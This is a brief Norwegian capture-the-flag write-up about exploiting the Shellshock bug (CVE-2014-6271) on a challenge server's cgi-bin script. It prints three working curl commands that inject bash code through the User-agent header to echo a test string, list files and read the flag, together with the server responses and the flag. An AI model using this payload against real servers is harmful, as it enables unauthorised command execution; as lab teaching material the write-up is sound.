# ShellCOCK

TCPdump av trafikk. Ser noen av urlene inneholder cgi-bin

Ser videre pA den og prOver AA bruke shellchock vuln
```
$curl -H "User-agent: () { :;}; echo; echo vulnerable" http://challenges.ctfd.io:30034/cgi-bin/5c54360f4185244a9f5de69ad4033966
================================================
vulnerable
Content-type: text/html

<html>
  <head>
    <title>Skallsjokkert webserver</title>        
    <meta charset="UTF-8" />
    <meta http-equiv="refresh" content="0; URL='/81e64f44f76733837993268803e0a3c8'" />
  </head> 

  <body>
          <center><img alt="War-neuroses" src="/800px-War-neuroses._Wellcome_L0023554.jpg" width=300 height=386><br>
                  Source: Wikipedia
  <!-- omg! kast den i søppelkassa! -->
  </body>
</html>
```

Tester om vi har tilgang pA filer i mappen

```
$ curl -H "User-agent: () { :;}; echo; /bin/ls" http://challenges.ctfd.io:30034/cgi-bin/5c54360f4185244a9f5de69ad4033966
===============================================
5c54360f4185244a9f5de69ad4033966
flagg_f874a24ab9537a8f74a482eed3754892.txt

```

#### Ta flagg

```
$ curl -H "User-agent: () { :;}; echo; /bin/cat flagg_f874a24ab9537a8f74a482eed3754892.txt" http://challenges.ctfd.io:30034/cgi-bin/5c54360f4185244a9f5de69ad4033966
EGG{bash_prosesserer_data_etter_funksjonsdefinisjon__CVE-2014-6271}

```
